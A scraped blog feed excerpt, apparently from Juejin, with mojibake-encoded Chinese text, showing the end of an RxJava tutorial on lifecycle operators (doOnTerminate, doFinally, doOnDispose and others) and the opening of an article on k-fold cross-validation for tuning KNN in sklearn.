<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// æ­£å¸¸å®Œæˆçš„æƒ…å†µ</span>
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .doOnTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"å³å°†å®Œæˆ/å‡ºé”™"</span>)
                )
                .doOnComplete(() -&gt;
                        System.out.println(<span class="hljs-string">"doOnComplete"</span>)
                )
                .subscribe(
                        item -&gt; System.out.println(<span class="hljs-string">"æ¥æ”¶: "</span> + item),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"onComplete"</span>)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ¥æ”¶: A</span>
        <span class="hljs-comment">// æ¥æ”¶: B</span>
        <span class="hljs-comment">// å³å°†å®Œæˆ/å‡ºé”™</span>
        <span class="hljs-comment">// doOnComplete</span>
        <span class="hljs-comment">// onComplete</span>

        <span class="hljs-comment">// å‡ºé”™çš„æƒ…å†µ</span>
        Observable.error(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"æµ‹è¯•"</span>))
                .doOnTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"å³å°†å®Œæˆ/å‡ºé”™"</span>)
                )
                .doOnError(error -&gt;
                        System.out.println(<span class="hljs-string">"doOnError: "</span> + error.getMessage())
                )
                .subscribe(
                        item -&gt; {
                        },
                        error -&gt; System.out.println(<span class="hljs-string">"onError: "</span> + error.getMessage())
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// å³å°†å®Œæˆ/å‡ºé”™</span>
        <span class="hljs-comment">// doOnError: æµ‹è¯•</span>
        <span class="hljs-comment">// onError: æµ‹è¯•</span>

    }
</code></pre>
<h4 data-id="heading-56">doAfterTerminate - å®Œæˆ/é”™è¯¯åæ‰§è¡Œ</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// æ­£å¸¸å®Œæˆçš„æƒ…å†µ</span>
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .doAfterTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"å®Œæˆ/å‡ºé”™åæ‰§è¡Œ"</span>)
                )
                .doOnComplete(() -&gt;
                        System.out.println(<span class="hljs-string">"doOnComplete"</span>)
                )
                .subscribe(
                        item -&gt; System.out.println(<span class="hljs-string">"æ¥æ”¶: "</span> + item),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"onComplete"</span>)
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ¥æ”¶: A</span>
        <span class="hljs-comment">// æ¥æ”¶: B</span>
        <span class="hljs-comment">// doOnComplete</span>
        <span class="hljs-comment">// onComplete</span>
        <span class="hljs-comment">// å®Œæˆ/å‡ºé”™åæ‰§è¡Œ</span>

        <span class="hljs-comment">// å‡ºé”™çš„æƒ…å†µ</span>
        Observable.error(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"æµ‹è¯•"</span>))
                .doAfterTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"å®Œæˆ/å‡ºé”™åæ‰§è¡Œ"</span>)
                )
                .doOnError(error -&gt;
                        System.out.println(<span class="hljs-string">"doOnError: "</span> + error.getMessage())
                )
                .subscribe(
                        item -&gt; {
                        },
                        error -&gt; System.out.println(<span class="hljs-string">"onError: "</span> + error.getMessage())
                );

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// doOnError: æµ‹è¯•</span>
        <span class="hljs-comment">// onError: æµ‹è¯•</span>
        <span class="hljs-comment">// å®Œæˆ/å‡ºé”™åæ‰§è¡Œ</span>
    }
</code></pre>
<h4 data-id="heading-57">doOnDispose - å–æ¶ˆè®¢é˜…æ—¶</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Disposable</span> <span class="hljs-variable">disposable</span> <span class="hljs-operator">=</span> Observable.interval(<span class="hljs-number">1</span>, TimeUnit.SECONDS)
                .doOnDispose(() -&gt;
                        System.out.println(<span class="hljs-string">"è®¢é˜…è¢«å–æ¶ˆäº†"</span>)
                )
                .subscribe(num -&gt;
                        System.out.println(<span class="hljs-string">"è®¡æ•°: "</span> + num)
                );

        Thread.sleep(<span class="hljs-number">3500</span>);
        disposable.dispose();

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// è®¡æ•°: 0</span>
        <span class="hljs-comment">// è®¡æ•°: 1</span>
        <span class="hljs-comment">// è®¡æ•°: 2</span>
        <span class="hljs-comment">// è®¢é˜…è¢«å–æ¶ˆäº†</span>
    }
</code></pre>
<h4 data-id="heading-58">doFinally - æœ€ç»ˆæ‰§è¡Œ</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"æ•°æ®"</span>)
                .doFinally(() -&gt;
                        System.out.println(<span class="hljs-string">"æ— è®ºå¦‚ä½•éƒ½ä¼šæ‰§è¡Œ"</span>)
                )
                .subscribe();

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// æ— è®ºå¦‚ä½•éƒ½ä¼šæ‰§è¡Œ</span>
    }
</code></pre>
<h4 data-id="heading-59">doOnEach - æ¯ä¸ªäº‹ä»¶æ—¶</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .doOnEach(notification -&gt; {
                    <span class="hljs-keyword">if</span> (notification.isOnNext()) {
                        System.out.println(<span class="hljs-string">"å‘å°„: "</span> + notification.getValue());
                    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (notification.isOnComplete()) {
                        System.out.println(<span class="hljs-string">"å®Œæˆ"</span>);
                    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (notification.isOnError()) {
                        System.out.println(<span class="hljs-string">"é”™è¯¯: "</span> + notification.getError());
                    }
                })
                .subscribe();

        <span class="hljs-comment">// è¾“å‡ºï¼š</span>
        <span class="hljs-comment">// å‘å°„: A</span>
        <span class="hljs-comment">// å‘å°„: B</span>
        <span class="hljs-comment">// å‘å°„: C</span>
        <span class="hljs-comment">// å®Œæˆ</span>
    }
</code></pre>
<h4 data-id="heading-60">doOnRequest - è¯·æ±‚æ—¶ï¼ˆèƒŒå‹ç›¸å…³ï¼‰</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Flowable.range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)
                .doOnRequest(requested -&gt;
                        System.out.println(<span class="hljs-string">"ä¸‹æ¸¸è¯·æ±‚äº† "</span> + requested + <span class="hljs-string">" ä¸ªå…ƒç´ "</span>)
                )
                .subscribe(
                        num -&gt; System.out.println(<span class="hljs-string">"æ¥æ”¶: "</span> + num),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"å®Œæˆ"</span>)
                );

    }
</code></pre>
<h2 data-id="heading-61">ç»“æŸ</h2>
<p>å“åº”å¼ç¼–ç¨‹ç¡®å®éœ€è¦ä¸€äº›æ—¶é—´æ¥æŒæ¡ï¼Œä½†ä¸€æ—¦ç†è§£æ ¸å¿ƒæ¦‚å¿µï¼Œä½ å°±ä¼šå‘ç°å®ƒåœ¨å¤„ç†å¼‚æ­¥æ•°æ®æµæ—¶çš„å¼ºå¤§ä¹‹å¤„ã€‚</p>
<p>ä»å›è°ƒåœ°ç‹±åˆ°æµç•…çš„é“¾å¼è°ƒç”¨ï¼Œä»æ‰‹å¿™è„šä¹±çš„èµ„æºç®¡ç†åˆ°æ™ºèƒ½çš„èƒŒå‹æ§åˆ¶ï¼Œå“åº”å¼ç¼–ç¨‹è®©å¤æ‚å¼‚æ­¥æ“ä½œå˜å¾—æ¸…æ™°å¯æ§ã€‚è™½ç„¶å­¦ä¹ æ›²çº¿å­˜åœ¨ï¼Œä½†æŠ•å…¥æ˜¯å€¼å¾—çš„ã€‚</p>
<p>è®°ä½ï¼Œä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½éœ€è¦å“åº”å¼ã€‚åœ¨åˆé€‚çš„ä¸šåŠ¡åœºæ™¯ä¸‹ä½¿ç”¨ï¼Œæ‰èƒ½å‘æŒ¥æœ€å¤§ä»·å€¼ã€‚å»ºè®®ä»å®é™…é¡¹ç›®çš„å°æ¨¡å—å¼€å§‹å°è¯•ï¼Œé€æ­¥ç§¯ç´¯ç»éªŒã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡å†…å®¹èƒ½ä¸ºä½ æ‰“å¼€å“åº”å¼ç¼–ç¨‹çš„å¤§é—¨ã€‚ç¼–ç¨‹ä¹‹è·¯å°±æ˜¯ä¸æ–­å­¦ä¹ çš„è¿‡ç¨‹ï¼Œä¿æŒå¥½å¥‡ï¼Œç»§ç»­æ¢ç´¢å§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ•°æ®-197 KæŠ˜äº¤å‰éªŒè¯å®æˆ˜ï¼šsklearn çœ‹å‡å€¼/æ–¹å·®ï¼Œé€‰æ›´ç¨³çš„ KNN è¶…å‚]]></title>    <link>https://juejin.cn/post/7588300640599900166</link>    <guid>https://juejin.cn/post/7588300640599900166</guid>    <pubDate>2025-12-28T13:55:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588300640599900166" data-draft-id="7588680081326735402" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ•°æ®-197 KæŠ˜äº¤å‰éªŒè¯å®æˆ˜ï¼šsklearn çœ‹å‡å€¼/æ–¹å·®ï¼Œé€‰æ›´ç¨³çš„ KNN è¶…å‚"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-28T13:55:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­¦å­åº·"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ•°æ®-197 KæŠ˜äº¤å‰éªŒè¯å®æˆ˜ï¼šsklearn çœ‹å‡å€¼/æ–¹å·®ï¼Œé€‰æ›´ç¨³çš„ KNN è¶…å‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­¦å­åº·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T13:55:17.000Z" title="Sun Dec 28 2025 13:55:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>åœºæ™¯ï¼šåŒä¸€æ¨¡å‹å¤šæ¬¡è®­ç»ƒè¯„ä¼°æ³¢åŠ¨å¤§ï¼Œå•æ¬¡åˆ’åˆ†ä¸å¯ä¿¡ï¼ŒK å€¼éš¾å®š</li>
<li>ç»“è®ºï¼šç”¨ K æŠ˜äº¤å‰éªŒè¯çœ‹â€œå¹³å‡åˆ† + æ–¹å·®â€ï¼Œä¼˜å…ˆé€‰é«˜å‡å€¼ä¸”æ–¹å·®å°çš„åŒºé—´</li>
<li>äº§å‡ºï¼šä¸€å¥—å¯å¤ç”¨çš„ cross_val_score æµç¨‹ + ç»“åˆå­¦ä¹ æ›²çº¿çš„ç¨³å®šæ€§é€‰å‚æ–¹æ³•</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efcd037c5153436caa1224825c15bc86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=RbiFT1JvrmxM5K3Qtnt4lFi078k%3D" alt="å¤§æ•°æ®-197 KæŠ˜äº¤å‰éªŒè¯å®æˆ˜ï¼šsklearn çœ‹å‡å€¼/æ–¹å·®ï¼Œé€‰æ›´ç¨³çš„ KNN è¶…å‚" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5877cbd48a0d4469b025210929be161e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=emQMGSbbqgIUYGPn60O9oSwfTuY%3D" alt="å¤§æ•°æ®-197 KæŠ˜äº¤å‰éªŒè¯å®æˆ˜ï¼šsklearn çœ‹å‡å€¼/æ–¹å·®ï¼Œé€‰æ›´ç¨³çš„ KNN è¶…å‚" loading="lazy"/></p>
<h2 data-id="heading-1">äº¤å‰éªŒè¯</h2>
<p>ç¡®å®šäº† K å€¼ä¹‹åï¼Œæˆ‘ä»¬è¿˜èƒ½å¤Ÿè§‚å¯Ÿåˆ°ä¸€ä¸ªé‡è¦ç°è±¡ï¼šæ¯æ¬¡è¿è¡Œæ¨¡å‹æ—¶ï¼Œå­¦ä¹ æ›²çº¿éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæ¨¡å‹çš„æ•ˆæœæ—¶å¥½æ—¶åï¼Œå‘ˆç°å‡ºä¸ç¨³å®šæ€§ã€‚è¿™ç§æ³¢åŠ¨ç°è±¡ä¸»è¦æ˜¯ç”±ä»¥ä¸‹åŸå› é€ æˆçš„ï¼š</p>
<ol>
<li>
<p><strong>æ•°æ®é›†åˆ’åˆ†çš„éšæœºæ€§</strong>ï¼š</p>
<ul>
<li>æ¯æ¬¡è¿è¡Œæ—¶ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„åˆ’åˆ†æ–¹å¼ä¸åŒï¼ˆé€šå¸¸æ˜¯é€šè¿‡éšæœºé‡‡æ ·ï¼‰</li>
<li>ä¸¾ä¾‹æ¥è¯´ï¼Œå‡è®¾æˆ‘ä»¬æœ‰1000æ¡æ•°æ®ï¼Œç¬¬ä¸€æ¬¡å¯èƒ½éšæœºé€‰å–700æ¡ä½œä¸ºè®­ç»ƒé›†ï¼Œå‰©ä¸‹çš„300æ¡ä½œä¸ºæµ‹è¯•é›†ï¼›ç¬¬äºŒæ¬¡è¿è¡Œæ—¶ï¼Œè¿™ä¸ªåˆ’åˆ†ç»„åˆåˆä¼šå‘ç”Ÿå˜åŒ–</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®åˆ†å¸ƒçš„å½±å“</strong>ï¼š</p>
<ul>
<li>ä¸åŒçš„è®­ç»ƒé›†ä¼šå­¦åˆ°ç•¥å¾®ä¸åŒçš„æ¨¡å¼</li>
<li>æµ‹è¯•é›†çš„ä¸åŒç»„æˆä¼šå¯¼è‡´è¯„ä¼°æŒ‡æ ‡æ³¢åŠ¨</li>
<li>ä¾‹å¦‚ï¼Œå¦‚æœæŸæ¬¡æµ‹è¯•é›†ä¸­æ°å¥½åŒ…å«è¾ƒå¤šè¾¹ç•Œæ¡ˆä¾‹ï¼Œæ¨¡å‹è¡¨ç°å°±ä¼šè¾ƒå·®</li>
</ul>
</li>
</ol>
<p>åœ¨å®é™…ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œè¿™ç§æƒ…å†µåæ˜ äº†å‡ ä¸ªå…³é”®é—®é¢˜ï¼š</p>
<ol>
<li>
<p><strong>å†å²æ•°æ®ä¸æ–°æ•°æ®çš„å·®å¼‚</strong>ï¼š</p>
<ul>
<li>è®­ç»ƒæ•°æ®é€šå¸¸æ˜¯é™æ€çš„å†å²æ•°æ®</li>
<li>æµ‹è¯•æ•°æ®åˆ™æ¨¡æ‹Ÿæœªæ¥æ–°è¿›å…¥ç³»ç»Ÿçš„å®æ—¶æ•°æ®</li>
<li>åœ¨ç”µå•†æ¨èç³»ç»Ÿä¸­ï¼Œç”¨è¿‡å»3ä¸ªæœˆçš„è®¢å•æ•°æ®è®­ç»ƒï¼Œä½†éœ€è¦é¢„æµ‹æœªæ¥ä¸€å‘¨çš„è´­ä¹°è¡Œä¸º</li>
</ul>
</li>
<li>
<p><strong>æ¨¡å‹è¯„ä¼°çš„æ ¸å¿ƒç›®æ ‡</strong>ï¼š</p>
<ul>
<li>æˆ‘ä»¬è¿½æ±‚çš„æ˜¯æ¨¡å‹åœ¨æœªçŸ¥æ•°æ®ä¸Šçš„è¡¨ç°</li>
<li>è¿™ç§èƒ½åŠ›è¢«ç§°ä¸ºæ³›åŒ–èƒ½åŠ›(Generalization Ability)</li>
<li>å¥½çš„æ³›åŒ–èƒ½åŠ›æ„å‘³ç€ï¼š
<ul>
<li>å¯¹å™ªå£°æ•°æ®ä¿æŒé²æ£’æ€§</li>
<li>èƒ½å¤„ç†æœªè§è¿‡çš„æ•°æ®æ¨¡å¼</li>
<li>é¿å…è¿‡æ‹Ÿåˆè®­ç»ƒæ•°æ®çš„ç‰¹å®šç‰¹å¾</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>æé«˜æ³›åŒ–èƒ½åŠ›çš„æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨äº¤å‰éªŒè¯ä»£æ›¿å•æ¬¡åˆ’åˆ†</li>
<li>å¢åŠ æ•°æ®å¤šæ ·æ€§</li>
<li>é‡‡ç”¨æ­£åˆ™åŒ–æŠ€æœ¯</li>
<li>ä¾‹å¦‚ï¼Œåœ¨é‡‘èé£æ§æ¨¡å‹ä¸­ï¼Œä¼šä½¿ç”¨5æŠ˜äº¤å‰éªŒè¯æ¥æ›´å¯é åœ°è¯„ä¼°æ¨¡å‹æ•ˆæœ</li>
</ul>
</li>
</ol>
<p>è¿™ç§ç°è±¡æé†’æˆ‘ä»¬ï¼Œåœ¨æ¨¡å‹å¼€å‘è¿‡ç¨‹ä¸­ä¸èƒ½ä»…ä¾èµ–å•æ¬¡è¿è¡Œçš„è¯„ä¼°ç»“æœï¼Œè€Œéœ€è¦é€šè¿‡å¤šæ¬¡éªŒè¯æ¥è·å¾—ç¨³å®šçš„æ€§èƒ½è¯„ä¼°ï¼Œè¿™æ‰æ˜¯ä¿è¯æ¨¡å‹åœ¨å®é™…ä¸šåŠ¡ä¸­å¯é è¡¨ç°çš„å…³é”®ã€‚</p>
<h3 data-id="heading-2">æ³›åŒ–èƒ½åŠ›</h3>
<p>æˆ‘ä»¬åœ¨è¿›è¡Œå­¦ä¹ çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå°†ä¸€ä¸ªæ ·æœ¬é›†åˆ†åŒ–ä¸ºã€è®­ç»ƒé›†ã€‘å’Œã€æµ‹è¯•é›†ã€‘ï¼Œå…¶ä¸­è®­ç»ƒé›†ç”¨äºæ¨¡å‹çš„å­¦ä¹ å’Œè®­ç»ƒï¼Œè€Œåæµ‹è¯•é›†é€šå¸¸ç”¨äºè¯„ä¼°è®­ç»ƒå¥½çš„æ¨¡å‹å¯¹äºæ•°æ®çš„é¢„æµ‹æ€§çš„è¯„ä¼°ã€‚</p>
<ul>
<li>è®­ç»ƒè¯¯å·®ä»£è¡¨æ¨¡å‹åœ¨è®­ç»ƒé›†ä¸Šçš„é”™åˆ†æ ·æœ¬æ¯”ç‡ã€‚</li>
<li>æµ‹è¯•è¯¯å·®ä»£è¡¨æ¨¡å‹åœ¨æµ‹è¯•é›†ä¸Šçš„é”™åˆ†æ ·æœ¬æ¯”ç‡ã€‚</li>
</ul>
<p>è®­ç»ƒè¯¯å·®çš„å¤§å°ï¼Œç”¨æ¥åˆ¤æ–­ç»™å®šé—®é¢˜æ˜¯ä¸æ˜¯ä¸€ä¸ªå®¹æ˜“å­¦ä¹ çš„é—®é¢˜ï¼Œæµ‹è¯•è¯¯å·®ååº”äº†æ¨¡å‹å¯¹æœªçŸ¥æ•°æ®çš„é¢„æµ‹èƒ½åŠ›ï¼Œæµ‹è¯•è¯¯å·®å°çš„å­¦ä¹ æ–¹æ³•å…·æœ‰å¾ˆå¥½çš„é¢„æµ‹èƒ½åŠ›ï¼Œå¦‚æœå¾—åˆ°çš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†æ²¡æœ‰äº¤é›†ï¼Œé€šå¸¸å°†æ­¤é¢„æµ‹èƒ½åŠ›ç§°ä¸ºæ³›åŒ–èƒ½åŠ›ï¼ˆgeneralization abilityï¼‰ã€‚
æˆ‘ä»¬è®¤ä¸ºï¼Œå¦‚æœæ¨¡å‹åœ¨ä¸€å¥—è®­ç»ƒé›†å’Œæ•°æ®é›†ä¸Šè¡¨ç°ä¼˜ç§€ï¼Œé‚£è¯´æ˜ä¸äº†é—®é¢˜ï¼Œåªèƒ½åœ¨ä¼—å¤šä¸åŒçš„è®­ç»ƒé›†å’Œæµ‹è¯•é›†ä¸Šéƒ½è¡¨ç°ä¼˜ç§€ï¼Œæ¨¡å‹æ‰æ˜¯ä¸€ä¸ªç¨³å®šçš„æ¨¡å‹ï¼Œæ¨¡å‹æ‰æ˜¯å…·æœ‰çœŸæ­£æ„ä¹‰ä¸Šçš„æ³›åŒ–èƒ½åŠ›ã€‚
ä¸ºæ­¤ï¼Œæœºå™¨å­¦ä¹ é¢†åŸŸæœ‰å‘æŒ¥ç¥ä½œç”¨çš„æŠ€èƒ½ï¼šã€äº¤å‰éªŒè¯ã€‘ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬è®¤è¯†æ¨¡å‹ã€‚</p>
<h3 data-id="heading-3">kæŠ˜äº¤å‰éªŒè¯</h3>
<p>æœ€å¸¸ç”¨çš„äº¤å‰éªŒè¯æ–¹æ³•æ˜¯ K æŠ˜äº¤å‰éªŒè¯ï¼ˆK-Fold Cross Validationï¼‰ã€‚è¿™ç§æ–¹æ³•é€šè¿‡å°†æ•°æ®é›†åˆ’åˆ†ä¸º K ä¸ªå¤§å°ç›¸ä¼¼çš„äº’æ–¥å­é›†ï¼Œæ¯æ¬¡ä½¿ç”¨å…¶ä¸­ K-1 ä¸ªå­é›†ä½œä¸ºè®­ç»ƒæ•°æ®ï¼Œå‰©ä¸‹çš„ 1 ä¸ªå­é›†ä½œä¸ºéªŒè¯æ•°æ®ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ K æ¬¡ï¼Œæœ€ç»ˆå¾—åˆ° K ä¸ªæ¨¡å‹è¯„ä¼°ç»“æœçš„å¹³å‡å€¼ã€‚</p>
